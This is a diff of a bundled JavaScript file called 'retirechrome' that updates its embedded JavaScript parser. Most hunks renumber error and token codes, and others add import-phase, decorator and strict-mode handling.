-            parser.report(127);
+            parser.report(129);
           }
         }
         parser.assignable = 2;
@@ -6128,7 +6472,7 @@ var retirechrome = (() => {
           if (!canAssign)
             parser.report(26);
           if (parser.getToken() === 22)
-            parser.report(124);
+            parser.report(126);
           let argument = null;
           let delegate = false;
           if ((parser.flags & 1) === 0) {
@@ -6154,16 +6498,16 @@ var retirechrome = (() => {
         if (inGroup)
           parser.destructible |= 128;
         if (context & 524288)
-          parser.report(177);
+          parser.report(179);
         const possibleIdentifierOrArrowFunc = parseIdentifierOrArrow(parser, context, privateScope);
         const isIdentifier = possibleIdentifierOrArrowFunc.type === "ArrowFunctionExpression" || (parser.getToken() & 65536) === 0;
         if (isIdentifier) {
           if (context & 2048)
-            throw new ParseError(start, { index: parser.startIndex, line: parser.startLine, column: parser.startColumn }, 176);
+            throw new ParseError(start, { index: parser.startIndex, line: parser.startLine, column: parser.startColumn }, 178);
           if (context & 2)
-            throw new ParseError(start, { index: parser.startIndex, line: parser.startLine, column: parser.startColumn }, 110);
+            throw new ParseError(start, { index: parser.startIndex, line: parser.startLine, column: parser.startColumn }, 112);
           if (context & 8192 && context & 2048)
-            throw new ParseError(start, { index: parser.startIndex, line: parser.startLine, column: parser.startColumn }, 110);
+            throw new ParseError(start, { index: parser.startIndex, line: parser.startLine, column: parser.startColumn }, 112);
           return possibleIdentifierOrArrowFunc;
         }
         if (context & 8192) {
@@ -6187,6 +6531,7 @@ var retirechrome = (() => {
       }
       function parseFunctionBody(parser, context, scope, privateScope, origin, funcNameToken, functionScope) {
         const { tokenStart } = parser;
+        parser.flags &= -4161;
         consume(parser, context | 32, 2162700);
         const body = [];
         if (parser.getToken() !== 1074790415) {
@@ -6212,16 +6557,20 @@ var retirechrome = (() => {
           if (context & 1) {
             if (funcNameToken) {
               if ((funcNameToken & 537079808) === 537079808) {
-                parser.report(119);
+                parser.report(121);
               }
               if ((funcNameToken & 36864) === 36864) {
                 parser.report(40);
               }
             }
             if (parser.flags & 512)
-              parser.report(119);
-            if (parser.flags & 256)
-              parser.report(118);
+              parser.report(121);
+            if (parser.flags & 256) {
+              if (parser.strictReservedRange) {
+                throw new ParseError(parser.strictReservedRange[0], parser.strictReservedRange[1], 120);
+              }
+              parser.report(120);
+            }
           }
         }
         parser.flags = (parser.flags | 512 | 256 | 64 | 4096) ^ (512 | 256 | 64 | 4096);
@@ -6242,8 +6591,8 @@ var retirechrome = (() => {
         const { tokenStart } = parser;
         nextToken(parser, context);
         switch (parser.getToken()) {
-          case 67108990:
-            parser.report(167);
+          case 67108991:
+            parser.report(169);
           case 67174411: {
             if ((context & 512) === 0)
               parser.report(28);
@@ -6288,10 +6637,10 @@ var retirechrome = (() => {
           switch (parser.getToken()) {
             case 67108877: {
               nextToken(parser, (context | 262144 | 8) ^ 8);
-              if (context & 16 && parser.getToken() === 130 && parser.tokenValue === "super") {
-                parser.report(173);
+              if (context & 16 && parser.getToken() === 131 && parser.tokenValue === "super") {
+                parser.report(175);
               }
-              parser.assignable = 1;
+              parser.assignable = (parser.flags & 2048) === 2048 ? 2 : 1;
               const property = parsePropertyOrPrivatePropertyName(parser, context | 64, privateScope);
               expr = parser.finishNode({
                 type: "MemberExpression",
@@ -6303,6 +6652,10 @@ var retirechrome = (() => {
               break;
             }
             case 69271571: {
+              if ((parser.flags & 8192) === 8192) {
+                parser.flags = (parser.flags | 8192) ^ 8192;
+                return expr;
+              }
               let restoreHasOptionalChaining = false;
               if ((parser.flags & 2048) === 2048) {
                 restoreHasOptionalChaining = true;
@@ -6312,7 +6665,7 @@ var retirechrome = (() => {
               const { tokenStart } = parser;
               const property = parseExpressions(parser, context, privateScope, inGroup, 1, tokenStart);
               consume(parser, context, 20);
-              parser.assignable = 1;
+              parser.assignable = restoreHasOptionalChaining ? 2 : 1;
               expr = parser.finishNode({
                 type: "MemberExpression",
                 object: expr,
@@ -6352,7 +6705,7 @@ var retirechrome = (() => {
               }
               break;
             }
-            case 67108990: {
+            case 67108991: {
               nextToken(parser, (context | 262144 | 8) ^ 8);
               parser.flags |= 2048;
               parser.assignable = 2;
@@ -6361,7 +6714,7 @@ var retirechrome = (() => {
             }
             default:
               if ((parser.flags & 2048) === 2048) {
-                parser.report(166);
+                parser.report(168);
               }
               parser.assignable = 2;
               expr = parser.finishNode({
@@ -6433,10 +6786,10 @@ var retirechrome = (() => {
         return node;
       }
       function parsePropertyOrPrivatePropertyName(parser, context, privateScope) {
-        if ((parser.getToken() & 143360) === 0 && parser.getToken() !== -2147483528 && parser.getToken() !== -2147483527 && parser.getToken() !== 130) {
-          parser.report(160);
+        if ((parser.getToken() & 143360) === 0 && parser.getToken() !== -2147483527 && parser.getToken() !== -2147483526 && parser.getToken() !== 131) {
+          parser.report(162);
         }
-        return parser.getToken() === 130 ? parsePrivateIdentifier(parser, context, privateScope, 0) : parseIdentifier(parser, context);
+        return parser.getToken() === 131 ? parsePrivateIdentifier(parser, context, privateScope, 0) : parseIdentifier(parser, context);
       }
       function parseUpdateExpressionPrefixed(parser, context, privateScope, inNew, isLHS, start) {
         if (inNew)
@@ -6480,10 +6833,10 @@ var retirechrome = (() => {
             return parseArrowFromIdentifier(parser, context, privateScope, tokenValue, expr, inNew, canAssign, 0, start);
           }
           if (context & 16 && !(context & 32768) && !(context & 8192) && parser.tokenValue === "arguments")
-            parser.report(130);
+            parser.report(132);
           if ((token & 255) === (241737 & 255)) {
             if (context & 1)
-              parser.report(113);
+              parser.report(115);
             if (kind & (8 | 16))
               parser.report(100);
           }
@@ -6521,7 +6874,10 @@ var retirechrome = (() => {
             return parseThisExpression(parser, context);
           case 65540:
             return parseRegExpLiteral(parser, context);
-          case 132:
+          case 133:
+            if (!(parser.features & 1)) {
+              parser.report(30, "@");
+            }
           case 86094:
             return parseClassExpression(parser, context, privateScope, inGroup, start);
           case 86109:
@@ -6532,9 +6888,9 @@ var retirechrome = (() => {
             return parseTemplate(parser, context, privateScope);
           case 86107:
             return parseNewExpression(parser, context, privateScope, inGroup);
-          case 134283388:
+          case 134283389:
             return parseBigIntLiteral(parser, context);
-          case 130:
+          case 131:
             return parsePrivateIdentifier(parser, context, privateScope, 0);
           case 86106:
             return parseImportCallOrMetaExpression(parser, context, privateScope, inNew, inGroup, start);
@@ -6550,23 +6906,36 @@ var retirechrome = (() => {
       function parseImportCallOrMetaExpression(parser, context, privateScope, inNew, inGroup, start) {
         let expr = parseIdentifier(parser, context);
         if (parser.getToken() === 67108877) {
-          return parseImportMetaExpression(parser, context, expr, start);
+          return parseImportMetaExpression(parser, context, expr, start, privateScope, inGroup, inNew);
         }
         if (inNew)
-          parser.report(142);
+          parser.report(144);
         expr = parseImportExpression(parser, context, privateScope, inGroup, start);
         parser.assignable = 2;
         return parseMemberOrUpdateExpression(parser, context, privateScope, expr, inGroup, 0, start);
       }
-      function parseImportMetaExpression(parser, context, meta, start) {
-        if ((context & 2) === 0)
-          parser.report(169);
+      function parseImportMetaExpression(parser, context, meta, start, privateScope, inGroup = 0, inNew = 0) {
+        const propertyStart = parser.tokenStart;
+        const propertyEnd = parser.currentLocation;
         nextToken(parser, context);
         const token = parser.getToken();
-        if (token !== 209030 && parser.tokenValue !== "meta") {
-          parser.report(174);
+        const isPhaseDefer = parser.features & 2 && (token & -2147483648) === 0 && parser.tokenValue === "defer";
+        const isPhaseSource = parser.features & 4 && (token & -2147483648) === 0 && parser.tokenValue === "source";
+        if (isPhaseDefer || isPhaseSource) {
+          if (inNew)
+            parser.report(144);
+          nextToken(parser, context);
+          const expression = parseImportExpression(parser, context, privateScope, inGroup, start, parser.tokenValue);
+          parser.assignable = 2;
+          return expression;
+        }
+        if ((context & 2) === 0) {
+          throw new ParseError(propertyStart, propertyEnd, 171);
+        }
+        if (token !== 209031 && parser.tokenValue !== "meta") {
+          parser.report(176);
         } else if (token & -2147483648) {
-          parser.report(175);
+          parser.report(177);
         }
         parser.assignable = 2;
         return parser.finishNode({
@@ -6575,10 +6944,10 @@ var retirechrome = (() => {
           property: parseIdentifier(parser, context)
         }, start);
       }
-      function parseImportExpression(parser, context, privateScope, inGroup, start) {
+      function parseImportExpression(parser, context, privateScope, inGroup, start, phase = null) {
         consume(parser, context | 32, 67174411);
         if (parser.getToken() === 14)
-          parser.report(143);
+          parser.report(145);
         const source = parseExpression(parser, context, privateScope, 1, inGroup, parser.tokenStart);
         let options = null;
         if (parser.getToken() === 18) {
@@ -6592,7 +6961,8 @@ var retirechrome = (() => {
         const node = {
           type: "ImportExpression",
           source,
-          options
+          options,
+          ...parser.features & 2 || parser.features & 4 ? { phase } : null
         };
         consume(parser, context, 16);
         return parser.finishNode(node, start);
@@ -6610,7 +6980,7 @@ var retirechrome = (() => {
           const value = parseStringLiteral(parser, context);
           const keyContent = key.type === "Literal" ? key.value : key.name;
           if (keysContent.has(keyContent)) {
-            parser.report(145, `${keyContent}`);
+            parser.report(147, keyContent);
           }
           keysContent.add(keyContent);
           attributes.push(parser.finishNode({
@@ -6645,7 +7015,7 @@ var retirechrome = (() => {
         if (parser.getToken() === 134283267) {
           const value = parser.tokenValue;
           if (!value.isWellFormed()) {
-            parser.report(171);
+            parser.report(173);
           }
           return parseLiteral(parser, context);
         } else if (parser.getToken() & 143360) {
@@ -6702,6 +7072,7 @@ var retirechrome = (() => {
           consume(parser, context, 67174409);
           quasis.push(parseTemplateElement(parser, tokenValue2, tokenRaw2, tokenStart2, true));
         }
+        parser.assignable = 2;
         return parser.finishNode({
           type: "TemplateLiteral",
           expressions,
@@ -6718,11 +7089,16 @@ var retirechrome = (() => {
           tail
         }, start);
         const tailSize = tail ? 1 : 2;
-        if (parser.options.ranges) {
-          node.start += 1;
-          node.range[0] += 1;
-          node.end -= tailSize;
-          node.range[1] -= tailSize;
+        const { ranges } = parser.options;
+        if (ranges) {
+          if (ranges.start)
+            node.start += 1;
+          if (ranges.end)
+            node.end -= tailSize;
+          if (ranges.range) {
+            node.range[0] += 1;
+            node.range[1] -= tailSize;
+          }
         }
         if (parser.options.loc) {
           node.loc.start.column += 1;
@@ -6774,7 +7150,7 @@ var retirechrome = (() => {
       }
       function parseLiteral(parser, context) {
         const { tokenValue, tokenRaw, tokenStart } = parser;
-        if (parser.getToken() === 134283388) {
+        if (parser.getToken() === 134283389) {
           return parseBigIntLiteral(parser, context);
         }
         const node = {
@@ -7097,7 +7473,7 @@ var retirechrome = (() => {
           }
           parser.destructible = destructible;
           if (parser.getToken() !== closingToken && parser.getToken() !== 18)
-            parser.report(161);
+            parser.report(163);
           return parser.finishNode({
             type: isPattern ? "RestElement" : "SpreadElement",
             argument
@@ -7174,8 +7550,8 @@ var retirechrome = (() => {
             let state = 0;
             let key = null;
             let value;
-            if (parser.getToken() & 143360 || parser.getToken() === -2147483528 || parser.getToken() === -2147483527) {
-              if (parser.getToken() === -2147483527)
+            if (parser.getToken() & 143360 || parser.getToken() === -2147483527 || parser.getToken() === -2147483526) {
+              if (parser.getToken() === -2147483526)
                 destructible |= 16;
               key = parseIdentifier(parser, context);
               if (parser.getToken() === 18 || parser.getToken() === 1074790415 || parser.getToken() === 1077936155) {
@@ -7196,7 +7572,7 @@ var retirechrome = (() => {
                     right
                   }, tokenStart);
                 } else {
-                  destructible |= (token === 209006 ? 128 : 0) | (token === -2147483528 ? 16 : 0);
+                  destructible |= (token === 209006 ? 128 : 0) | (token === -2147483527 ? 16 : 0);
                   value = parser.cloneIdentifier(key);
                 }
               } else if (consumeOpt(parser, context | 32, 21)) {
@@ -7288,11 +7664,11 @@ var retirechrome = (() => {
                 value = parseMethodDefinition(parser, context, privateScope, state, inGroup, parser.tokenStart);
               } else if (parser.getToken() & 143360) {
                 destructible |= 16;
-                if (token === -2147483528)
+                if (token === -2147483527)
                   parser.report(95);
                 if (token === 209005) {
                   if (parser.flags & 1)
-                    parser.report(132);
+                    parser.report(134);
                   state |= 16 | 1;
                 } else if (token === 209008) {
                   state |= 256;
@@ -7338,7 +7714,7 @@ var retirechrome = (() => {
                 key = parseLiteral(parser, context);
                 value = parseMethodDefinition(parser, context, privateScope, state, inGroup, parser.tokenStart);
               } else {
-                parser.report(133);
+                parser.report(135);
               }
             } else if ((parser.getToken() & 134217728) === 134217728) {
               key = parseLiteral(parser, context);
@@ -7415,7 +7791,7 @@ var retirechrome = (() => {
                 value = parseMethodDefinition(parser, context, privateScope, state, inGroup, parser.tokenStart);
                 destructible = 16;
               } else {
-                parser.report(134);
+                parser.report(136);
               }
             } else if (parser.getToken() === 69271571) {
               key = parseComputedPropertyName(parser, context, privateScope, inGroup);
@@ -7519,7 +7895,7 @@ var retirechrome = (() => {
                 key = parseComputedPropertyName(parser, context, privateScope, inGroup);
                 value = parseMethodDefinition(parser, context, privateScope, state, inGroup, parser.tokenStart);
               } else {
-                parser.report(126);
+                parser.report(128);
               }
             } else {
               parser.report(30, KeywordDescTable[token & 255]);
@@ -7558,6 +7934,7 @@ var retirechrome = (() => {
         consume(parser, context, 67174411);
         const params = [];
         parser.flags = (parser.flags | 128) ^ 128;
+        parser.strictReservedRange = null;
         if (parser.getToken() === 16) {
           if (kind & 512) {
             parser.report(37, "Setter", "one", "");
@@ -7581,6 +7958,7 @@ var retirechrome = (() => {
             if ((context & 1) === 0) {
               if ((parser.getToken() & 36864) === 36864) {
                 parser.flags |= 256;
+                parser.strictReservedRange ??= [tokenStart, parser.currentLocation];
               }
               if ((parser.getToken() & 537079808) === 537079808) {
                 parser.flags |= 512;
@@ -7684,7 +8062,7 @@ var retirechrome = (() => {
             parser.assignable = 2;
             if (parser.getToken() !== 16 && parser.getToken() !== 18) {
               if (destructible & 8)
-                parser.report(122);
+                parser.report(124);
               expr = parseMemberOrUpdateExpression(parser, context, privateScope, expr, 0, 0, tokenStart);
               destructible |= 16;
               if (parser.getToken() !== 16 && parser.getToken() !== 18) {
@@ -7753,7 +8131,7 @@ var retirechrome = (() => {
         }
         consume(parser, context, 16);
         if (destructible & 16 && destructible & 8)
-          parser.report(151);
+          parser.report(153);
         destructible |= parser.destructible & 256 ? 256 : 0 | parser.destructible & 128 ? 128 : 0;
         if (parser.getToken() === 10) {
           if (destructible & (32 | 16))
@@ -7773,7 +8151,7 @@ var retirechrome = (() => {
           parser.report(63);
         }
         if (destructible & 8) {
-          parser.report(144);
+          parser.report(146);
         }
         parser.destructible = (parser.destructible | 256) ^ 256 | destructible;
         return parser.options.preserveParens ? parser.finishNode({
@@ -7838,16 +8216,17 @@ var retirechrome = (() => {
           switch (parser.getToken()) {
             case 69271571:
               if ((parser.flags & 1) === 0) {
-                parser.report(116);
+                parser.report(118);
               }
+              parser.flags |= 8192;
               break;
             case 67108877:
             case 67174409:
             case 22:
-              parser.report(117);
+              parser.report(119);
             case 67174411:
               if ((parser.flags & 1) === 0) {
-                parser.report(116);
+                parser.report(118);
               }
               parser.flags |= 1024;
               break;
@@ -7855,7 +8234,7 @@ var retirechrome = (() => {
           if ((parser.getToken() & 8388608) === 8388608 && (parser.flags & 1) === 0)
             parser.report(30, KeywordDescTable[parser.getToken() & 255]);
           if ((parser.getToken() & 33619968) === 33619968)
-            parser.report(125);
+            parser.report(127);
         }
         parser.assignable = 2;
         return parser.finishNode({
@@ -7870,6 +8249,7 @@ var retirechrome = (() => {
       function parseFormalParametersOrFormalList(parser, context, scope, privateScope, inGroup, kind) {
         consume(parser, context, 67174411);
         parser.flags = (parser.flags | 128) ^ 128;
+        parser.strictReservedRange = null;
         const params = [];
         if (consumeOpt(parser, context, 16))
           return params;
@@ -7883,6 +8263,7 @@ var retirechrome = (() => {
             if ((context & 1) === 0) {
               if ((token & 36864) === 36864) {
                 parser.flags |= 256;
+                parser.strictReservedRange ??= [tokenStart, parser.currentLocation];
               }
               if ((token & 537079808) === 537079808) {
                 parser.flags |= 512;
@@ -7972,7 +8353,7 @@ var retirechrome = (() => {
         const id = parseIdentifier(parser, context | 32);
         const { tokenStart } = parser;
         if (consumeOpt(parser, context, 67108877)) {
-          if (context & 65536 && parser.getToken() === 209029) {
+          if (context & 65536 && parser.getToken() === 209030) {
             parser.assignable = 2;
             return parseMetaProperty(parser, context, id, start);
           }
@@ -7984,8 +8365,8 @@ var retirechrome = (() => {
         }
         const expr = parsePrimaryExpression(parser, context, privateScope, 2, 1, 0, inGroup, 1, tokenStart);
         context = (context | 131072) ^ 131072;
-        if (parser.getToken() === 67108990)
-          parser.report(168);
+        if (parser.getToken() === 67108991)
+          parser.report(170);
         const callee = parseMemberExpressionNoCall(parser, context, privateScope, expr, inGroup, tokenStart);
         parser.assignable = 2;
         return parser.finishNode({
@@ -8037,7 +8418,7 @@ var retirechrome = (() => {
           }, start);
         }
         let destructible = 0;
-        let expr = null;
+        let expr;
         let isNonSimpleParameterList = 0;
         parser.destructible = (parser.destructible | 256 | 128) ^ (256 | 128);
         const params = [];
@@ -8074,7 +8455,7 @@ var retirechrome = (() => {
             isNonSimpleParameterList = 1;
             if (parser.getToken() !== 16 && parser.getToken() !== 18) {
               if (destructible & 8)
-                parser.report(122);
+                parser.report(124);
               expr = parseMemberOrUpdateExpression(parser, context, privateScope, expr, 0, 0, tokenStart);
               destructible |= 16;
               if ((parser.getToken() & 8388608) === 8388608) {
@@ -8165,9 +8546,6 @@ var retirechrome = (() => {
         let start;
         let decorators;
         if (parser.leadingDecorators.decorators.length) {
-          if (parser.getToken() === 132) {
-            parser.report(30, "@");
-          }
           start = parser.leadingDecorators.start;
           decorators = [...parser.leadingDecorators.decorators];
           parser.leadingDecorators.decorators.length = 0;
@@ -8176,16 +8554,16 @@ var retirechrome = (() => {
           decorators = parseDecorators(parser, context, privateScope);
         }
         context = (context | 16384 | 1) ^ 16384;
-        nextToken(parser, context);
+        consume(parser, context, 86094);
         let id = null;
         let superClass = null;
         const { tokenValue } = parser;
         if (parser.getToken() & 4096 && parser.getToken() !== 20565) {
           if (isStrictReservedWord(parser, context, parser.getToken())) {
-            parser.report(118);
+            parser.report(120);
           }
           if ((parser.getToken() & 537079808) === 537079808) {
-            parser.report(119);
+            parser.report(121);
           }
           if (scope) {
             scope.addBlockName(context, tokenValue, 32, 0);
@@ -8213,7 +8591,7 @@ var retirechrome = (() => {
           id,
           superClass,
           body,
-          ...parser.options.next ? { decorators } : null
+          ...parser.features & 1 ? { decorators } : null
         }, start);
       }
       function parseClassExpression(parser, context, privateScope, inGroup, start) {
@@ -8221,12 +8599,12 @@ var retirechrome = (() => {
         let superClass = null;
         const decorators = parseDecorators(parser, context, privateScope);
         context = (context | 1 | 16384) ^ 16384;
-        nextToken(parser, context);
+        consume(parser, context, 86094);
         if (parser.getToken() & 4096 && parser.getToken() !== 20565) {
           if (isStrictReservedWord(parser, context, parser.getToken()))
-            parser.report(118);
+            parser.report(120);
           if ((parser.getToken() & 537079808) === 537079808) {
-            parser.report(119);
+            parser.report(121);
           }
           id = parseIdentifier(parser, context);
         }
@@ -8244,24 +8622,59 @@ var retirechrome = (() => {
           id,
           superClass,
           body,
-          ...parser.options.next ? { decorators } : null
+          ...parser.features & 1 ? { decorators } : null
         }, start);
       }
       function parseDecorators(parser, context, privateScope) {
         const list = [];
-        if (parser.options.next) {
-          while (parser.getToken() === 132) {
-            list.push(parseDecoratorList(parser, context, privateScope));
+        if (parser.features & 1) {
+          while (parser.getToken() === 133) {
+            list.push(parseDecorator(parser, context, privateScope));
           }
         }
         return list;
       }
-      function parseDecoratorList(parser, context, privateScope) {
+      function parseDecorator(parser, context, privateScope) {
         const start = parser.tokenStart;
         nextToken(parser, context | 32);
         const expressionStart = parser.tokenStart;
-        let expression = parsePrimaryExpression(parser, context, privateScope, 2, 0, 1, 0, 1, start);
-        expression = parseMemberOrUpdateExpression(parser, context, privateScope, expression, 0, 0, expressionStart);
+        let expression;
+        if (parser.getToken() === 67174411) {
+          expression = parsePrimaryExpression(parser, context, privateScope, 2, 0, 1, 0, 1, start);
+        } else {
+          const token = parser.getToken();
+          if ((token & 143360) !== 143360 && !isValidIdentifier(context, token) || context & 1 && (token & 36864) === 36864) {
+            parser.report(30, KeywordDescTable[token & 255]);
+          }
+          if (token === 209006 && context & (2048 | 2)) {
+            parser.report(112);
+          }
+          if (token === 241771 && context & 1024) {
+            parser.report(97, "yield");
+          }
+          let memberExpression = parseIdentifier(parser, context | 64);
+          while (parser.getToken() === 67108877) {
+            nextToken(parser, (context | 262144 | 8) ^ 8);
+            const property = parsePropertyOrPrivatePropertyName(parser, context | 64, privateScope);
+            memberExpression = parser.finishNode({
+              type: "MemberExpression",
+              object: memberExpression,
+              computed: false,
+              property,
+              optional: false
+            }, expressionStart);
+          }
+          expression = memberExpression;
+          if (parser.getToken() === 67174411) {
+            const args = parseArguments(parser, context, privateScope, 0);
+            expression = parser.finishNode({
+              type: "CallExpression",
+              callee: memberExpression,
+              arguments: args,
+              optional: false
+            }, expressionStart);
+          }
+        }
         return parser.finishNode({
           type: "Decorator",
           expression
@@ -8280,13 +8693,13 @@ var retirechrome = (() => {
           const decoratorStart = parser.tokenStart;
           const decorators = parseDecorators(parser, context, privateScope);
           if (decorators.length > 0 && parser.tokenValue === "constructor") {
-            parser.report(109);
+            parser.report(111);
           }
           if (parser.getToken() === 1074790415)
-            parser.report(108);
+            parser.report(110);
           if (consumeOpt(parser, context, 1074790417)) {
             if (decorators.length > 0)
-              parser.report(120);
+              parser.report(122);
             continue;
           }
           body.push(parseClassElementList(parser, context, scope, privateScope, inheritedContext, kind, decorators, 0, inGroup, decorators.length > 0 ? decoratorStart : parser.tokenStart));
@@ -8303,7 +8716,7 @@ var retirechrome = (() => {
         let kind = isStatic ? 32 : 0;
         let key = null;
         const token = parser.getToken();
-        if (token & (143360 | 36864) || token === -2147483528) {
+        if (token & (143360 | 36864) || token === -2147483527) {
           key = parseIdentifier(parser, context);
           switch (token) {
             case 36970:
@@ -8321,6 +8734,9 @@ var retirechrome = (() => {
               break;
             case 209008:
               if (parser.getToken() !== 67174411) {
+                if (parser.getToken() === 8391476 && parser.flags & 1) {
+                  return parsePropertyDefinition(parser, context, privateScope, key, kind, decorators, start);
+                }
                 if ((parser.getToken() & 1073741824) === 1073741824) {
                   return parsePropertyDefinition(parser, context, privateScope, key, kind, decorators, start);
                 }
@@ -8329,6 +8745,9 @@ var retirechrome = (() => {
               break;
             case 209009:
               if (parser.getToken() !== 67174411) {
+                if (parser.getToken() === 8391476 && parser.flags & 1) {
+                  return parsePropertyDefinition(parser, context, privateScope, key, kind, decorators, start);
+                }
                 if ((parser.getToken() & 1073741824) === 1073741824) {
                   return parsePropertyDefinition(parser, context, privateScope, key, kind, decorators, start);
                 }
@@ -8340,7 +8759,7 @@ var retirechrome = (() => {
                 if ((parser.getToken() & 1073741824) === 1073741824) {
                   return parsePropertyDefinition(parser, context, privateScope, key, kind, decorators, start);
                 }
-                if (parser.options.next)
+                if (parser.features & 1)
                   kind |= 1024;
               }
               break;
@@ -8353,14 +8772,14 @@ var retirechrome = (() => {
         } else if (token === 8391476) {
           kind |= 8;
           nextToken(parser, context);
-        } else if (parser.getToken() === 130) {
+        } else if (parser.getToken() === 131) {
           kind |= 8192;
           key = parsePrivateIdentifier(parser, context | 16, privateScope, 768);
         } else if ((parser.getToken() & 1073741824) === 1073741824) {
           kind |= 128;
         } else if (isStatic && token === 2162700) {
           return parseStaticBlock(parser, context | 16, scope, privateScope, start);
-        } else if (token === -2147483527) {
+        } else if (token === -2147483526) {
           key = parseIdentifier(parser, context);
           if (parser.getToken() !== 67174411)
             parser.report(30, KeywordDescTable[parser.getToken() & 255]);
@@ -8368,23 +8787,23 @@ var retirechrome = (() => {
           parser.report(30, KeywordDescTable[parser.getToken() & 255]);
         }
         if (kind & (8 | 16 | 768 | 1024)) {
-          if (parser.getToken() & 143360 || parser.getToken() === -2147483528 || parser.getToken() === -2147483527) {
+          if (parser.getToken() & 143360 || parser.getToken() === -2147483527 || parser.getToken() === -2147483526) {
             key = parseIdentifier(parser, context);
           } else if ((parser.getToken() & 134217728) === 134217728) {
             key = parseLiteral(parser, context);
           } else if (parser.getToken() === 69271571) {
             kind |= 2;
             key = parseComputedPropertyName(parser, context, privateScope, 0);
-          } else if (parser.getToken() === 130) {
+          } else if (parser.getToken() === 131) {
             kind |= 8192;
             key = parsePrivateIdentifier(parser, context, privateScope, kind);
           } else
-            parser.report(135);
+            parser.report(137);
         }
         if ((kind & 2) === 0) {
           if (parser.tokenValue === "constructor") {
             if ((parser.getToken() & 1073741824) === 1073741824) {
-              parser.report(129);
+              parser.report(131);
             } else if ((kind & 32) === 0 && parser.getToken() === 67174411) {
               if (kind & (768 | 16 | 128 | 8)) {
                 parser.report(53, "accessor");
@@ -8411,7 +8830,7 @@ var retirechrome = (() => {
           computed: (kind & 2) > 0,
           key,
           value,
-          ...parser.options.next ? { decorators } : null
+          ...parser.features & 1 ? { decorators } : null
         }, start);
       }
       function parsePrivateIdentifier(parser, context, privateScope, kind) {
@@ -8419,7 +8838,7 @@ var retirechrome = (() => {
         nextToken(parser, context);
         const { tokenValue } = parser;
         if (tokenValue === "constructor")
-          parser.report(128);
+          parser.report(130);
         if (parser.options.lexical) {
           if (!privateScope)
             parser.report(4, tokenValue);
@@ -8442,8 +8861,8 @@ var retirechrome = (() => {
         if (parser.getToken() === 1077936155) {
           nextToken(parser, context | 32);
           const { tokenStart } = parser;
-          if (parser.getToken() === 537079927)
-            parser.report(119);
+          if (parser.getToken() === 537079928)
+            parser.report(121);
           const modifierFlags = 1024 | 2048 | 8192 | ((state & 64) === 0 ? 512 | 16384 : 0);
           context = (context | modifierFlags) ^ modifierFlags | (state & 8 ? 1024 : 0) | (state & 16 ? 2048 : 0) | (state & 64 ? 16384 : 0) | 256 | 65536;
           value = parsePrimaryExpression(parser, context | 16, privateScope, 2, 0, 1, 0, 1, tokenStart);
@@ -8459,11 +8878,11 @@ var retirechrome = (() => {
           value,
           static: (state & 32) > 0,
           computed: (state & 2) > 0,
-          ...parser.options.next ? { decorators } : null
+          ...parser.features & 1 ? { decorators } : null
         }, start);
       }
       function parseBindingPattern(parser, context, scope, privateScope, type, origin) {
-        if (parser.getToken() & 143360 || (context & 1) === 0 && parser.getToken() === -2147483527)
+        if (parser.getToken() & 143360 || (context & 1) === 0 && parser.getToken() === -2147483526)
           return parseAndClassifyIdentifier(parser, context, scope, type, origin);
         if ((parser.getToken() & 2097152) !== 2097152)
           parser.report(30, KeywordDescTable[parser.getToken() & 255]);
@@ -8478,9 +8897,9 @@ var retirechrome = (() => {
         const token = parser.getToken();
         if (context & 1) {
           if ((token & 537079808) === 537079808) {
-            parser.report(119);
-          } else if ((token & 36864) === 36864 || token === -2147483527) {
-            parser.report(118);
+            parser.report(121);
+          } else if ((token & 36864) === 36864 || token === -2147483526) {
+            parser.report(120);
           }
         }
         if ((token & 20480) === 20480) {
@@ -8490,7 +8909,7 @@ var retirechrome = (() => {
           if (context & 1024)
             parser.report(32);
           if (context & 2)
-            parser.report(111);
+            parser.report(113);
         }
         if ((token & 255) === (241737 & 255)) {
           if (kind & (8 | 16))
@@ -8498,9 +8917,9 @@ var retirechrome = (() => {
         }
         if (token === 209006) {
           if (context & 2048)
-            parser.report(176);
+            parser.report(178);
           if (context & 2)
-            parser.report(110);
+            parser.report(112);
         }
         const { tokenValue, tokenStart: start } = parser;
         nextToken(parser, context);
@@ -8532,7 +8951,7 @@ var retirechrome = (() => {
           [children, closingElement] = parseJSXChildrenAndClosingElement(parser, context, privateScope, inJSXChild);
           const close = isEqualTagName(closingElement.name);
           if (isEqualTagName(openingElement.name) !== close)
-            parser.report(155, close);
+            parser.report(157, close);
         }
         return parser.finishNode({
           type: "JSXElement",
@@ -8598,7 +9017,7 @@ var retirechrome = (() => {
         }
       }
       function parseJSXChildOrClosingElement(parser, context, privateScope, inJSXChild) {
-        if (parser.getToken() === 137)
+        if (parser.getToken() === 138)
           return parseJSXText(parser, context);
         if (parser.getToken() === 2162700)
           return parseJSXExpressionContainer(parser, context, privateScope, 1, 0);
@@ -8612,7 +9031,7 @@ var retirechrome = (() => {
         parser.report(0);
       }
       function parseJSXChildOrClosingFragment(parser, context, privateScope, inJSXChild) {
-        if (parser.getToken() === 137)
+        if (parser.getToken() === 138)
           return parseJSXText(parser, context);
         if (parser.getToken() === 2162700)
           return parseJSXExpressionContainer(parser, context, privateScope, 1, 0);
@@ -8721,7 +9140,7 @@ var retirechrome = (() => {
               value = parseJSXExpressionContainer(parser, context, privateScope, 0, 1);
               break;
             default:
-              parser.report(154);
+              parser.report(156);
           }
         }
         return parser.finishNode({
@@ -8745,10 +9164,10 @@ var retirechrome = (() => {
         const { tokenStart } = parser;
         if (parser.getToken() === 14)
           return parseJSXSpreadChild(parser, context, privateScope, start);
-        let expression = null;
+        let expression;
         if (parser.getToken() === 1074790415) {
           if (isAttr)
-            parser.report(157);
+            parser.report(159);
           expression = parseJSXEmptyExpression(parser, {
             index: parser.startIndex,
             line: parser.startLine,
@@ -8796,7 +9215,7 @@ var retirechrome = (() => {
           name: tokenValue
         }, start);
       }
-      var version = version$1;
+      var { version } = packageJson;
       function parseScript(source, options) {
         return parseSource(source, { ...options, sourceType: "script" });
       }
@@ -8850,6 +9269,14 @@ var retirechrome = (() => {
       };
       var isNodePath = (candidate) => {
         return typeof candidate === "object" && candidate != null && "node" in candidate;
+      };
+      var isTemplateLiteral = (candidate) => {
+        return isNode(candidate) && candidate.type === "TemplateLiteral";
+      };
+      var staticTemplateLiteralValue = (candidate) => {
+        if (!isTemplateLiteral(candidate)) return void 0;
+        if (candidate.expressions.length !== 0 || candidate.quasis.length !== 1) return void 0;
+        return candidate.quasis[0].value.cooked ?? void 0;
       };
       var isPrimitive = (value) => {
         return typeof value == "string" || typeof value == "number" || typeof value == "boolean";
@@ -9111,7 +9538,6 @@ var retirechrome = (() => {
